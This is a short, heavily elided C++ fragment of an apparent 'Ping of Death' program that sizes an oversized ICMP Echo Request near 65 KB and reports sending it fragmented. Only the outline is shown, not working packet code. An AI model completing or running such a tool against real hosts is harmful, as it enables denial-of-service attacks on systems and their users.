...
int main(int argc, char* argv[]) {
    ...
    // Create a huge ICMP packet (~65500 bytes)
    const int icmp_packet_size = IP_MAXPACKET - IP_HDRLEN; // 65535 - 20 = 65515 bytes ICMP packet
    ...
    std::cout << "Ping of Death packet sent (fragmented ICMP Echo Request ~65KB).\n";
